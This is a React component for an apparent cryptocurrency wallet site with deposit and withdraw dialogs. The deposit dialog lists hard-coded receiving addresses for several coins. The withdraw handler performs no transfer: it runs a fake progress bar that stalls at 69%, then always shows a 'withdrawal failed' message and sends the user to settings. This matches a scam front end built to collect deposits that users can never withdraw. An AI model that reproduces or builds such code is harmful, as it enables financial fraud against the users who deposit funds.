
import React, { useState } from 'react';
import { ArrowDownToLine, ArrowUpFromLine, Trophy, MessageCircle, Repeat, X, Loader2 } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { toast } from "sonner";
import { useNavigate } from "react-router-dom";
import { useLanguage } from "@/contexts/LanguageContext";
import { getTranslation } from '@/utils/translations';

interface WalletActionsProps {
  className?: string;
}

const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
  const [withdrawDialogOpen, setWithdrawDialogOpen] = useState(false);
  const [depositDialogOpen, setDepositDialogOpen] = useState(false);
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();
  const { language } = useLanguage();

  // Fixed wallet addresses for deposit
  const FIXED_ADDRESSES = {
    BTC: "19hjRhd7pYKdGvqDA9S6SPYbz6gfN5potm",
    ETH: "0x3951714b1886442255858e42653d9552b5d5073a",
    BNB: "0x3951714b1886442255858e42653d9552b5d5073a",
    TRX: "TPy4csxqvQGvygSBFGqDUvJXfYGCcpdVxL",
    USDT: "TPy4csxqvQGvygSBFGqDUvJXfYGCcpdVxL"
  };

  const handleWithdraw = () => {
    if (!withdrawAddress || !withdrawAmount) {
      toast.error(getTranslation('fillAllFields', language));
      return;
    }

    setLoading(true);
    
    // Simulate loading progress
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 69) {
          clearInterval(interval);
          setTimeout(() => {
            setLoading(false);
            toast.error(getTranslation('withdrawalFailed', language), {
              description: getTranslation('withdrawalFailedDesc', language),
              action: {
                label: getTranslation('goToSettings', language),
                onClick: () => navigate("/settings")
              }
            });
            setWithdrawDialogOpen(false);
            resetForm();
          }, 1000);
          return 69;
        }
        return prev + 5;
      });
    }, 300);
  };

  const resetForm = () => {
    setWithdrawAddress('');
    setWithdrawAmount('');
    setProgress(0);
  };

  const handleCopyAddress = (coin: string, address: string) => {
    navigator.clipboard.writeText(address);
    
    const coinName = coin === 'BTC' ? 'Bitcoin' :
                    coin === 'ETH' ? 'Ethereum' :
                    coin === 'BNB' ? 'Binance Coin' :
                    coin === 'TRX' ? 'Tron' : 'USDT';
    
    toast.success(getTranslation('addressCopied', language), {
      description: `${coinName} ${getTranslation('addressCopiedDesc', language)}`,
    });
  };

  return (
    <div className={`grid grid-cols-2 sm:grid-cols-4 gap-3 ${className}`}>
      <button 
        className="flex items-center justify-center gap-2 bg-crypto-blue text-white py-2.5 px-4 rounded-lg font-medium transition-all hover:bg-opacity-90 focus:ring-2 focus:ring-crypto-blue focus:ring-opacity-50"
        onClick={() => setWithdrawDialogOpen(true)}
      >
        <ArrowDownToLine className="h-4 w-4" />
        <span>{getTranslation('withdraw', language)}</span>
      </button>
      <button 
        className="flex items-center justify-center gap-2 bg-white dark:bg-gray-800 border border-border py-2.5 px-4 rounded-lg font-medium transition-all hover:bg-opacity-90 focus:ring-2 focus:ring-crypto-blue focus:ring-opacity-50"
        onClick={() => setDepositDialogOpen(true)}
      >
        <ArrowUpFromLine className="h-4 w-4" />
        <span>{getTranslation('deposit', language)}</span>
      </button>
      <button className="flex items-center justify-center gap-2 bg-white dark:bg-gray-800 border border-border py-2.5 px-4 rounded-lg font-medium transition-all hover:bg-opacity-90 focus:ring-2 focus:ring-crypto-blue focus:ring-opacity-50">
        <Trophy className="h-4 w-4" />
        <span>{getTranslation('winners', language)}</span>
      </button>
      <button className="flex items-center justify-center gap-2 bg-white dark:bg-gray-800 border border-border py-2.5 px-4 rounded-lg font-medium transition-all hover:bg-opacity-90 focus:ring-2 focus:ring-crypto-blue focus:ring-opacity-50">
        <MessageCircle className="h-4 w-4" />
        <span>{getTranslation('chat', language)}</span>
      </button>

      {/* Withdraw Dialog */}
      <Dialog open={withdrawDialogOpen} onOpenChange={setWithdrawDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>{getTranslation('withdrawFunds', language)}</DialogTitle>
            <DialogDescription>
              {getTranslation('withdrawDescription', language)}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <label htmlFor="address" className="text-sm font-medium">{getTranslation('walletAddress', language)}</label>
              <Input
                id="address"
                placeholder={getTranslation('enterAddress', language)}
                value={withdrawAddress}
                onChange={(e) => setWithdrawAddress(e.target.value)}
                disabled={loading}
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="amount" className="text-sm font-medium">{getTranslation('amount', language)}</label>
              <Input
                id="amount"
                type="number"
                placeholder="0.00"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                disabled={loading}
              />
            </div>
            {loading && (
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span>{getTranslation('processingWithdrawal', language)}</span>
                  <span>{progress}%</span>
                </div>
                <Progress value={progress} className="h-2" />
              </div>
            )}
          </div>
          <div className="flex justify-end gap-3">
            <Button variant="outline" onClick={() => {
              setWithdrawDialogOpen(false);
              resetForm();
            }} disabled={loading}>
              {getTranslation('cancel', language)}
            </Button>
            <Button onClick={handleWithdraw} disabled={loading}>
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  {getTranslation('processing', language)}
                </>
              ) : (
                getTranslation('withdraw', language)
              )}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Deposit Dialog */}
      <Dialog open={depositDialogOpen} onOpenChange={setDepositDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>{getTranslation('depositFunds', language)}</DialogTitle>
            <DialogDescription>
              {getTranslation('depositDescription', language)}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-4">
              {Object.entries(FIXED_ADDRESSES).map(([coin, address]) => (
                <div key={coin} className="p-3 border border-border rounded-lg">
                  <div className="flex justify-between items-center mb-2">
                    <h3 className="font-medium">{coin}</h3>
                    <button
                      onClick={() => handleCopyAddress(coin, address)}
                      className="text-sm text-crypto-blue hover:underline flex items-center"
                    >
                      {getTranslation('copyAddress', language)}
                    </button>
                  </div>
                  <div className="bg-muted/30 p-2 rounded text-xs font-mono break-all">
                    {address}
                  </div>
                </div>
              ))}
            </div>
            
            <div className="p-3 bg-yellow-50 dark:bg-yellow-900/20 rounded-lg border border-yellow-200 dark:border-yellow-900/30">
              <p className="text-sm text-yellow-800 dark:text-yellow-400">
                <span className="font-medium">{getTranslation('important', language)}:</span> {getTranslation('depositWarning', language)}
              </p>
            </div>
          </div>
          <div className="flex justify-end">
            <Button variant="outline" onClick={() => setDepositDialogOpen(false)}>
              {getTranslation('close', language)}
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default WalletActions;
